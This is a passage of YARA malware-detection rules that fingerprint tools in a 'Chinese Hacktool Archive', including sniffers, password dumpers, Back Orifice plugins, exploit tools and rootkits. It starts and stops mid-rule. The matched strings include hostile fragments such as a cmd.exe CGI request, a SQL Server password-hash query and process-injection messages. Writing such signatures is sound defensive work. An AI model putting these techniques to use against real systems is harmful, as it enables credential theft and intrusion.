		$s17 = "for(wait = WAITSEC; wait > 0; wait--) {" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_NetFuke_Filter_2 {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke_Filter.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "dbe7d95e001c3792b843baa0fbc9a9f11b9ee25a"
	strings:
		$s0 = "powered by shadow 2007/2/9 22:27" fullword ascii
		$s1 = "NetFuke_Filter.dll" fullword ascii
		$s2 = "Copyright (c) by shadow Stdio Lib" fullword ascii
		$s9 = "Type = * //IP,ARP,RARP" ascii
		$s17 = "DestIP = * //x.x.x.x" fullword ascii
		$s20 = "IPType = " fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_SQLServerSniffer {
	meta:
		description = "Chinese Hacktool Archive - file SQLServerSniffer.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "019b942b509184c99e4ccfba3b5c08ce20a210a5"
	strings:
		$s0 = ".exe 1433" ascii
		$s1 = "runtime error" fullword ascii
		$s3 = "SniffRS" ascii
		$s4 = ".xfocus.," ascii
		$s20 = "Kablto" ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_com2exe {
	meta:
		description = "Chinese Hacktool Archive - file com2exe.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "ea145be3d2e5ade6927028be1588d753389ca71a"
	strings:
		$s0 = "5  Examples: Comtoexe SourceFileName TargetFileName.  U" fullword ascii
		$s1 = "Commande inconnue" fullword ascii
		$s2 = "Lecteur de disque incorrect'Ne peut supprimer le r" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_RkNT {
	meta:
		description = "Chinese Hacktool Archive - file RkNT.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "dbce2324df5650edc3aa8c5812d0e3ab72dbde91"
	strings:
		$s0 = "CreateProcessW: %S" fullword ascii
		$s1 = "BiAPI.DLL" fullword ascii
	condition:
		PEFILE and $s0 and $s1
}

rule CN_Hacktools_tools_knlps {
	meta:
		description = "Chinese Hacktool Archive - file knlps.sys"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a24ccf0f5387d6ac0dbe4d5ebfa50eee98b1004c"
	strings:
		$s0 = "I:\\CPP\\driver\\knlps04\\objfre_w2k\\i386\\knlps.pdb" fullword ascii
		$s1 = "\\Device\\KNLPS" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_Pack_TBack {
	meta:
		description = "Chinese Hacktool Archive - file TBack.DLL"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "466b929217e989c204b41dbdda9e6cdef4e41f39"
	strings:
		$s0 = "d:\\documents and settings\\slackbot\\desktop\\test\\kk\\final\\new\\lcc\\public" ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_DebugMe {
	meta:
		description = "Chinese Hacktool Archive - file DebugMe.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c248ee73a5b63072910021deb9feb9530ddafc07"
	strings:
		$s0 = "ey4s.bat" fullword ascii
		$s1 = "ESP=%.8X CS=0x%X DS=0x%X ES=0x%X FS=0x%X" fullword ascii
		$s2 = "shellcode 0x%.8X" fullword ascii
		$s5 = "realcode 0x%.8X" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_XDIR {
	meta:
		description = "Chinese Hacktool Archive - file XDIR.EXE"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "af2f4165b998411dfb6b4dff5cf2635bb710cc94"
	strings:
		$s0 = "temp_321.bat" fullword ascii
		$s2 = "COMMAND.COMU" fullword ascii
		$s8 = "LHA.EXE" fullword ascii
		$s15 = "Insert diskette in drive %c" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_byshell063_ntboot {
	meta:
		description = "Chinese Hacktool Archive - file ntboot.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "862a1d398c952dea5f01246aab68f7a76ce8aae3"
	strings:
		$s5 = "\\ntboot.exe" fullword ascii
		$s6 = "Dumping Description to Registry..." fullword ascii
		$s8 = "ntboot.dll" fullword ascii
		$s10 = "NT Boot Service" fullword ascii
		$s12 = "Failure ... Access is Denied !" fullword ascii
		$s13 = "Creating Service .... " fullword ascii
		$s19 = "already Stopped !" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_getipfromfile {
	meta:
		description = "Chinese Hacktool Archive - file getipfromfile.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6763cfa9d13dc1d9c38bec10a8d6972fa0856a2c"
	strings:
		$s3 = "regsvr32.exe /s Comdlg32.ocx" fullword wide
		$s7 = "Not write your banner content!" fullword wide
		$s12 = "Not select Target File!" fullword wide
		$s13 = "\\shell\\open\\ddeexec\\Topic" fullword wide
		$s18 = "SUPERSCAN" fullword ascii
		$s19 = "\\shell\\open\\ddeexec\\Application" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_Enable_User_TOS {
	meta:
		description = "Chinese Hacktool Archive - file Enable_User_TOS.reg"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "818893e319d08102785e54f2fd257cb1e5d327b8"
	strings:
		$s0 = "\"DisableUserTOSSetting\"=dword:00000000" fullword wide
		$s1 = "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Paramet" wide
	condition:
		all of them
}

rule CN_Hacktools_Debug_Stream {
	meta:
		description = "Chinese Hacktool Archive - file Stream.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "48557418716bcd6f03830c709ee1c5a36cdb587e"
	strings:
		$s0 = "Stream.EXE" fullword wide
		$s2 = "Error %d when searching for \"%s\"." fullword ascii
		$s5 = "Error loading NTDLL.DLL. Huh?" fullword ascii
		$s6 = "Error %d [NTSTATUS %ld/%08lxh] on NQIF() of \"%s\"." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_vanquish_2 {
	meta:
		description = "Chinese Hacktool Archive - file vanquish.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "33a57fe4b8f61aec79602b3e5ebf0464c3cad66e"
	strings:
		$s0 = "Vanquish - DLL injection failed:" fullword ascii
		$s5 = "vanquish.exe" fullword wide
		$s7 = "Service install failed." fullword ascii
		$s17 = "VRTLogMutex" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_airdecap {
	meta:
		description = "Chinese Hacktool Archive - file airdecap.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7533a00b8d8a9c0a5680bf6a8225c68f70eb0448"
	strings:
		$s3 = "Input .cap file -> " fullword ascii
		$s14 = "Number of decrypted WEP  packets  % 8ld" fullword ascii
		$s18 = "fwrite(packet data) failed" fullword ascii
		$s20 = "Total number of WEP data packets  % 8ld" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_wry {
	meta:
		description = "Chinese Hacktool Archive - file wry.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "332a3780ccdfbc285ceb8ce7a05aab6b28f9fd48"
	strings:
		$s0 = "Zongheng " fullword ascii
		$s1 = "203.208.003.000  203.208.0O3.255  " fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_Nshc331 {
	meta:
		description = "Chinese Hacktool Archive - file Nshc331.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "9f230687ae9414823adf424d44c207f229d6e040"
	strings:
		$s1 = "Thank you for installing HFNetChk" ascii
		$s9 = "hfnetchk.exe" fullword ascii
		$s13 = "Readmefirst.txt" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_WinDlg_WinDlg {
	meta:
		description = "Chinese Hacktool Archive - file WinDlg.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f90b192d10b70d221f22c67958f775e3904abf2a"
	strings:
		$s0 = "!This program requires Win32" fullword ascii
		$s1 = "`imports" fullword ascii
		$s2 = "`IMPORTS" fullword ascii
		$s8 = "IDD_DLG" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_ntlm {
	meta:
		description = "Chinese Hacktool Archive - file ntlm.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "75dd681ab0f086bbb7c82fb836eb72aeeb19ae46"
	strings:
		$s0 = "password:%s" fullword ascii
		$s1 = "_read_encoded_value_with_base" fullword ascii
		$s5 = "PASS IS UPPER or not interrelated with ntlm." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_NTSwitch {
	meta:
		description = "Chinese Hacktool Archive - file NTSwitch.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a45a231e8ff32a9871cb8680978022d3b2999862"
	strings:
		$s0 = "NTSwitch.exe" fullword wide
		$s2 = "<description>Your app description here</description> " fullword ascii
		$s11 = "KLookupPrivilegeValueA" fullword ascii
		$s19 = "3am Laboratories PL" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_OpenRpcss {
	meta:
		description = "Chinese Hacktool Archive - file OpenRpcss.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e6d9546b19a561ea38a8d55aacb2f68030408c17"
	strings:
		$s6 = "Remote RpcSs Configure, by qing1010" fullword ascii
		$s10 = "Usage:OpenRpcSs.exe \\\\server" fullword ascii
		$s18 = "CONNECT ERR:%d!" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_PWDump4_2 {
	meta:
		description = "Chinese Hacktool Archive - file PWDump4.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "aa748bf7d47194d79ed8932a1af08009013b46b3"
	strings:
		$s0 = "numerateD Users In Domain %S" fullword ascii
		$s1 = "PWDump4.dll" fullword ascii
		$s2 = "Library samsrv.dll" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_zipdl {
	meta:
		description = "Chinese Hacktool Archive - file zipdl.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "879465fd1df81af75eff45a81d7944b85014249e"
	strings:
		$s0 = "Protocol not supported" fullword wide
		$s1 = "Content Length not found. Contact Iczelion" fullword ascii
		$s2 = "User-Agent: IczelionDownLoad" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_xclient {
	meta:
		description = "Chinese Hacktool Archive - file xclient.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fb9a819df4124185dae87efd0bd7ba9a6e287ee5"
	strings:
		$s0 = "Inject this Module To Other Process (Default: IEXPLORE.EXE)" fullword ascii
		$s8 = "Sniff Password define In File Port.ini" fullword ascii
		$s15 = "Process32First() Fail:Error %d" fullword ascii
		$s16 = "\\command.exe /c " fullword ascii
		$s20 = "MyDeleService() -> OpenService '%s' Error." fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_sqlntscan {
	meta:
		description = "Chinese Hacktool Archive - file sqlntscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "aa8d115b3cfb4dd6d041154938f58a9d7b5a002e"
	strings:
		$s0 = "Connected to MASTER database using current logon credentials..." fullword ascii
		$s1 = "WARNING: No Password has been set for this account!" fullword ascii
		$s3 = "Audit of  %s's logins" fullword ascii
		$s5 = "Password  0x%s" fullword ascii
		$s6 = "<H2><CENTER>SQL Server checks on %s</CENTER></H2>" fullword ascii
		$s7 = "SELECT name,password FROM master..syslogins" fullword ascii
		$s11 = "sqlntscan.dll" fullword ascii
	condition:
		5 of them
}

rule CN_Hacktools_ReleaseExe_NetFuke {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e409f9582485cf12c29193b50907e2efb3012eaa"
	strings:
		$s5 = "NetFuke.EXE" fullword wide
		$s6 = "%snetfuke_%d.nfk" fullword ascii
		$s7 = "cngz521@163.com" fullword ascii
		$s8 = "\\ocx\\step.xml" fullword ascii
		$s15 = "\\Device\\NPF_%s" fullword ascii
		$s18 = "Sniffer" fullword ascii
		$s20 = "NETMSG.DLL" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_ccpxdown {
	meta:
		description = "Chinese Hacktool Archive - file ccpxdown.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c158ab561cb5a854accd05bea8d3e3f601c0a8b1"
	strings:
		$s0 = "Code Send,target has" fullword ascii
		$s8 = "ipAddres@" fullword ascii
		$s13 = "[+] OK! Magic" ascii
		$s17 = "WritePtr" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_ReleaseExe_NetFuke_2 {
	meta:
		description = "Chinese Hacktool Archive - file NetFuke.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "6b262523eba96a7bf3220b586097c3506ac35746"
	strings:
		$s5 = "NetFuke.EXE" fullword wide
		$s6 = "%snetfuke_%d.nfk" fullword ascii
		$s7 = "cngz521@163.com" fullword ascii
		$s9 = "Update From ArpCheatSniffer" ascii
		$s14 = "ErrorCode:[%d]" fullword ascii
		$s15 = "\\Device\\NPF_%s" fullword ascii
		$s16 = "ERRORNUMBER: %d" fullword ascii
		$s17 = "Sniffer" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_sISS_Scanner {
	meta:
		description = "Chinese Hacktool Archive - file sISS Scanner.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "092adb0ea5191f74bde263b0ec4fb494abc45633"
	strings:
		$s2 = "sISS Scanner.exe" fullword wide
		$s19 = "site: www.clansoft.info / www.staff94.com / www.staff94.com:8080 / www.c" wide
		$s20 = "IIS Version Info:" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_sendip_v_1_5_sendip {
	meta:
		description = "Chinese Hacktool Archive - file sendip.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "28284caa6946e859ea3930ebdf8a285612fa10ac"
	strings:
		$s8 = "HELO worldcomputers.com" fullword wide
		$s11 = "sendip.exe" fullword wide
		$s18 = "NOTEPAD.EXE %1" fullword wide
		$s19 = ".exe %1" fullword wide
		$s20 = "WinsockGetIp" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_SuperScan4 {
	meta:
		description = "Chinese Hacktool Archive - file SuperScan4.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "292b66b7d4af43e7ee143e842a3261e225e0e81a"
	strings:
		$s0 = "SuperScan4.exe" fullword wide
		$s1 = "CorExitProcess" ascii
		$s3 = "Foundstone Inc." fullword wide
	condition:
		all of them
}

rule CN_Hacktools_io_io_udp {
	meta:
		description = "Chinese Hacktool Archive - file io_udp.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "33f8b52802c865d8d871bd87eeef6411e974cd70"
	strings:
		$s0 = "N[0,65535]:Default Port=54321" fullword ascii
		$s2 = "io_udp.dll" fullword ascii
		$s3 = "UDPIO: Back Orifice UDP IO Module v1.1" fullword ascii
		$s4 = "BO2K Simple Networking UDP" fullword ascii
		$s5 = "No Connect Addr" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_binder2_binder2 {
	meta:
		description = "Chinese Hacktool Archive - file binder2.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "adf58fa6c5a3cc4526201d83729d30bb30948de1"
	strings:
		$s0 = "runtime error -" fullword ascii
		$s1 = "\\syslog.en" fullword ascii
		$s4 = "WideCharToM" fullword ascii
		$s8 = "ReAlloc" fullword ascii
		$s10 = "- Kablto in" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_pw_inspector {
	meta:
		description = "Chinese Hacktool Archive - file pw-inspector.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "fea5db3bcdfdc87723aecd6704ef18643004d7bb"
	strings:
		$s8 = "Syntax: %s [-i FILE] [-o FILE] [-m MINLEN] [-M MAXLEN] [-c MINSETS] -l -u -n -p " ascii
		$s9 = "http://www.thc.org" fullword ascii
		$s16 = "Usage only allowed for legal purposes." fullword ascii
		$s19 = "PW-Inspector" fullword ascii
	condition:
		2 of them
}

rule CN_Hacktools_tools_ms05038 {
	meta:
		description = "Chinese Hacktool Archive - file ms05038.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "496326adfa78e0ba8a4313588f917635c5573f4e"
	strings:
		$s2 = "Made By ZwelL< http://www.donews.net/zwell>" fullword ascii
		$s4 = "<b>Fatal error</b>:  Maximum execution time of 30 seconds exceeded in <b>E:\\" fullword ascii
		$s7 = "Usage : ms05038.exe url [-t] " fullword ascii
		$s17 = "[+] download url:%s" fullword ascii
		$s19 = "[+] Build shellcode successful" fullword ascii
		$s20 = "Testing the shellcode..." fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_srv_getfile {
	meta:
		description = "Chinese Hacktool Archive - file srv_getfile.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "0c761cacd33c32131653008813453d6b50704e1d"
	strings:
		$s0 = "Please add http:// to the address!" fullword ascii
		$s3 = "srv_getfile.dll" fullword ascii
		$s5 = "Couldn't connect to remote machine!" fullword ascii
		$s10 = "File %s has %i bytes" fullword ascii
		$s11 = "Receive HTTP File" fullword ascii
		$s12 = "Filename to Save to" fullword ascii
		$s18 = "Please make sure that you REALLY want to download the index document!" fullword ascii
	condition:
		4 of them
}

rule CN_Hacktools_HYTop_CaseSwitch_2005 {
	meta:
		description = "Chinese Hacktool Archive - file 2005.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "96a80de7a4f24535ba6e07f27c1170e5cc5da6aa"
	strings:
		$s4 = "Hididi.net" fullword wide
		$s7 = "CommonDialog1" fullword ascii
		$s16 = "SELECTE" fullword ascii
		$s18 = "By Marcos Q26696782" fullword ascii
		$s19 = "Hididi" fullword wide
	condition:
		4 of them
}

rule CN_Hacktools_srv_legacy {
	meta:
		description = "Chinese Hacktool Archive - file srv_legacy.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1e5fd40929ac750463266a8afffe24d3cf5f96eb"
	strings:
		$s6 = "%2d: %s (RUNNING)" fullword ascii
		$s7 = "Plugin # out of range." fullword ascii
		$s8 = "srv_legacy.dll" fullword ascii
		$s10 = "BO2K Legacy Buttplug Support" fullword ascii
		$s12 = "%2d: %256s Returned: %256s" fullword ascii
		$s17 = "Too many modules loaded." fullword ascii
		$s18 = "Freeze File" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_tools_webscan {
	meta:
		description = "Chinese Hacktool Archive - file webscan.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "1e47bb9edbc18a3b8f0b87e9dc49ebaeb81e8f61"
	strings:
		$s4 = "GET /cgi-bin/cmd.exe?/c HTTP/1.0" fullword ascii
		$s5 = "GET /log.nsf/?Open HTTP/1.0" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_cis {
	meta:
		description = "Chinese Hacktool Archive - file cis.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "acc22d7861e534cc7857e3a8ebd673f0bbca9fb7"
	strings:
		$s13 = "GetDlgItemText() - Did you press \"SELECT\" without entering a host?" fullword ascii
		$s18 = "ftpscan.dll" fullword ascii
		$s20 = "smtpscan.dll" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_setup_bhusa2004 {
	meta:
		description = "Chinese Hacktool Archive - file setup-bhusa2004.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "c8e3a1e833b770a2d7291cd53aedf6bc60fe574e"
	strings:
		$s1 = "LzmaDecoderInit failed (%d)" fullword ascii
		$s2 = "0x90.org" fullword wide
		$s3 = "lzma: Compressed data is corrupted (%d)" fullword ascii
		$s9 = "/SL4 $%x %s %d %d %s" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_RootKit {
	meta:
		description = "Chinese Hacktool Archive - file RootKit.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8f5bf18875931750b1146fb553c4465101796fc9"
	strings:
		$s0 = "WINXP_RADIOBUTTON_NORMAL_CHECK WINXP_RADIOBUTTON_NORMAL_UNCHECK" fullword wide
		$s9 = "MACOS_CHECKBOX_DISABLE_UNCHECK" fullword wide
		$s18 = "OFTWARE\\Borland\\Delphi\\RTL" fullword ascii
		$s20 = "PROTEIN_TAB_LINE PROTEIN_TITLEBTN_CLOSE_MOUSEDOWN" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_ServiceTool {
	meta:
		description = "Chinese Hacktool Archive - file ServiceTool.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "318c70c861ff11131fcdf8b7f2ba748dfcdaf763"
	strings:
		$s0 = "ServiceTool.exe" fullword wide
		$s1 = "SlimFTPd Service Tool" fullword wide
		$s2 = "GetModuleFiNameA" fullword ascii
		$s3 = "ServiceTool" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_scanmsgr {
	meta:
		description = "Chinese Hacktool Archive - file scanmsgr.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "080121963e292c10dd41db328649a653862f6d2c"
	strings:
		$s2 = "Example: scanmsgr target=192.168.1.1-192.168.1.255" fullword ascii
		$s4 = "Parameters are name=value pairs, not -values: %s" fullword ascii
		$s9 = "invalid: source.port = %d" fullword ascii
		$s13 = "couldn't resolve host %s" fullword ascii
		$s20 = "---- Microsoft Messenger Service Buffer Overflow Vulnerability ----" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_bin_Safe3 {
	meta:
		description = "Chinese Hacktool Archive - file Safe3.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "68487a3f17a3ded1cd9ac74b22226c9ec740dacf"
	strings:
		$s3 = "Safe3 Asp.net Firwall" fullword wide
		$s5 = "Safe3.dll" fullword wide
		$s6 = "Safe3_nat.dll" fullword ascii
		$s8 = "AppendAllText" fullword ascii
		$s10 = "Can't find native library!  Please install the  native library to your l" wide
		$s14 = "Lock System" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_tools_Nethief {
	meta:
		description = "Chinese Hacktool Archive - file Nethief.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "da608341b4168ab0c2b839baf67b9bbb6d317a3b"
	strings:
		$s0 = "Nethief.EXE" fullword wide
		$s12 = "Nethief" fullword wide
	condition:
		all of them
}

rule CN_Hacktools_minihttp {
	meta:
		description = "Chinese Hacktool Archive - file minihttp.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "31fa20e4018e75b53f0b94cd5d1d00831ba23f4a"
	strings:
		$s2 = "minihttp.exe" fullword ascii
		$s6 = "%s\\-minihttp.conf" fullword ascii
		$s13 = "HTTP_PROXY_CONNECTION" fullword ascii
		$s14 = "is running on port %i..." fullword ascii
	condition:
		all of them
}


rule CN_Hacktools_DelDevil5 {
	meta:
		description = "Chinese Hacktool Archive - file DelDevil5.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "7574cf535ce5d6ee499398bb1e21bddbb7aabb56"
	strings:
		$s0 = "SOFTWARE\\Borland\\" fullword ascii
		$s4 = "TSERVICE1" fullword wide
		$s9 = "kernel32.dll" ascii
		$s12 = "bebebe" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_MS05039Scan {
	meta:
		description = "Chinese Hacktool Archive - file MS05039Scan.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a9e0d31831fa10d70143bf53e8b03f33b54cf95a"
	strings:
		$s4 = "Show &both vulnerable and not vulnerable systems" fullword wide
		$s14 = "IP,Hostname,NetBIOS,Status" fullword ascii
		$s17 = "send %d.%d.%d.%d \"%s\"" fullword ascii
		$s18 = "Not vulnerable" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_rainbowcrack_1_2_win_rcrack {
	meta:
		description = "Chinese Hacktool Archive - file rcrack.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "e7b6616cb1f3dd1674805668e4d93c9bbcf6f542"
	strings:
		$s0 = "invalid charset content %s in charset configuration file" fullword ascii
		$s17 = "rcrack rainbow_table_pathname -l hash_list_file" fullword ascii
		$s18 = "plaintext of %s is %s" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_injectdown {
	meta:
		description = "Chinese Hacktool Archive - file injectdown.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8a7f87a7ab7e1938873be899ccb3d04a8ef24877"
	strings:
		$s0 = "MZkernel32.dll" fullword ascii
		$s2 = "ComOan" fullword ascii
		$s3 = "ser32.dl" fullword ascii
		$s4 = "kern0l32.ud" fullword ascii
		$s6 = "urlmon.vd" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_scan1000 {
	meta:
		description = "Chinese Hacktool Archive - file scan1000.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "a5001681dd7f22bfe844473cbd0f3618137558d8"
	strings:
		$s0 = "F.INI" ascii
		$s1 = "onfig.sys*/a" ascii
		$s2 = "C:\\WINNT\\'C" ascii
		$s3 = "5/cgi-b/GWWEB.EXE/" ascii
		$s5 = "~QUIT" fullword ascii
		$s9 = "dattree" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_LSASecretsView {
	meta:
		description = "Chinese Hacktool Archive - file LSASecretsView.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "8a8e2e05066015aad5a2e3f690d814786323a7b1"
	strings:
		$s6 = "LSASecretsView.exe" fullword wide
		$s9 = "Software\\NirSoft\\LSASecretsView" fullword ascii
		$s18 = "SECURITY\\Policy\\Secrets" fullword ascii
		$s20 = "<tr><td%s nowrap><b>%s</b><td bgcolor=#%s%s>%s" fullword ascii
	condition:
		3 of them
}

rule CN_Hacktools_smartkid {
	meta:
		description = "Chinese Hacktool Archive - file smartkid.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "4c0af0e0e3765f506004c1f0b139ca11441dc54c"
	strings:
		$s0 = "Error! Try iisreset.exe /reboot to reboot system!" fullword ascii
		$s3 = "https://www.99bill.com/pay:songbohr@163.com" fullword ascii
		$s20 = "songbohr@163.com" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_SysFile_V1_1_SysFile {
	meta:
		description = "Chinese Hacktool Archive - file SysFile.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "f7fe179f91d9e7005b47ecdf8fb829d630b7894c"
	strings:
		$s3 = "CreateFileA failed !! %s" fullword ascii
		$s12 = "$LOGGED_UTILITY_STREAM" fullword ascii
		$s19 = "c:\\sysnap.hiv" fullword ascii
		$s20 = "Unmount Hive OK!" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_BkSSL {
	meta:
		description = "Chinese Hacktool Archive - file BkSSL.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "90e772e38e67b4a85989e7cacf7847706ad02525"
	strings:
		$s0 = "Connection %s: %d bytes sent to SSL, %d bytes sent to socket" fullword ascii
		$s1 = "Connection from %s:%d REFUSED by IDENT" fullword ascii
		$s18 = "WINSOCK DLL Version out of range (WSAVERNOTSUPPORTED)" fullword ascii
		$s19 = "%-15s = [host:]port connect remote host:port" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_telock_telock {
	meta:
		description = "Chinese Hacktool Archive - file telock.dll"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "2556d332255a27432232a31f396197e1298432c7"
	strings:
		$s0 = "telock.dll" fullword ascii
		$s1 = "kernel.dll" fullword ascii
		$s2 = "!Hydra Plugin" fullword ascii
		$s3 = "IsBadPtr" fullword ascii
	condition:
		all of them
}

rule CN_Hacktools_tools_nbtdump {
	meta:
		description = "Chinese Hacktool Archive - file nbtdump.exe"
		author = "Florian Roth"
		reference = "xfocus.net"
		date = "2015/03/22"
		score = 55
		hash = "cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8"
	strings:
		$s1 = "The %s account is an ADMINISTRATOR, and the password was" fullword wide
		$s6 = "c:\\>nbtdump remote-machine" fullword ascii
		$s7 = "%s's password is %s</H3>" fullword wide
